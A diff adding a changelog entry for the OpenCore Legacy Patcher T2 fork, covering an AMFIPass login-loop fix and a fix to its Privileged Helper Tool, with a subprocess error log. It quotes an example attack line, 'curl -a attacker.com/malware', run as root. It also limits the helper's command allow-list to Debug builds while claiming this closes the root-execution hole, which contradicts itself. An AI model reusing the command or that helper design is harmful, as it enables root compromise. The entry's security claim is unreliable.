@@ -1,4 +1,21 @@
 # OpenCore Legacy Patcher T2 changelog / OpenCore Legacy Patcher T2-Änderungsprotokoll
+## 4.0.0.19006.3 - 4.0.0 alpha 19.6.3
+This release:
+- fixes a bug where even when Disable AMFIPass is explicitly enabled in Settings, the patcher was still stripping out amfi=0x80 and that caused certain Macs to get stuck at a login loop when trying to sign in, thx @Medelcartelinc 
+- fixes a bug in the Priveleged Helper Tool  where when I was fixing a vulnerability that would let attackers execute arbitary code as root, in the mitigated code there was a bug, where the restriction of which commands are allowed to execute were also enforced on the release build, which at the end caused this error while trying to root patch:
+
+            Subprocess failed.
+                Command: ['/Library/PrivilegedHelperTools/com.albert-mueller.opencore-patcher-t2.privileged-helper', PosixPath('/var/folders/sf/89g8z5hs59g5r75hxfdkdg_r0000gp/T/tmpix_lubct/payloads/Tools/RSRRepair'), '--install']
+                Return Code: 171
+                    Likely Enum: OCLP_PHT_ERROR_COMMAND_NOT_ALLOWED
+                Standard Output:
+                    None
+                Standard Error:
+                    None
+
+This bug is fixed by enforcing the restrictions of which commands are allowed to be executed only on Debug builds. It was intended this restriction to be only for Debug builds.
+Previously prior to this patch, an attacker could execute any command (e.g curl -a attacker.com/malware) as root by abusing the Priveleged Helper Tool via living-off-the-land techniques.
+
 ## 4.0.0.19006.2 - 4.0.0 alpha 19.6.2
 This release:
 - fixes AttributeError while trying to install root patches
